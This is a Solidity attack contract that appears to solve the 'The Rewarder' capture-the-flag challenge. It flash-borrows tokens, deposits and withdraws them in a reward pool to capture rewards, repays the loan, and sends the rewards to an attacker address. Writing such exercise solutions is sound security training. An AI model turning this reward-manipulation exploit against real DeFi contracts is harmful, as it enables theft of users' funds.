// SPDX-License-Identifier: MIT
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

pragma solidity ^0.8.0;

contract AttackRewarderPool {
    TheRewarderPool private rewarderPool;
    FlashLoanerPool private flashLoanPool;
    DamnValuableToken private liquidityToken;
    address payable attacker;

    constructor(address _rewarderPool, address _flashLoanPool, address _liquidityToken, address payable _attacker) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        attacker = _attacker;
    }

    function flashLoan(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewarderPool.rewardToken().transfer(attacker, rewarderPool.rewardToken().balanceOf(address(this)));
    }
}
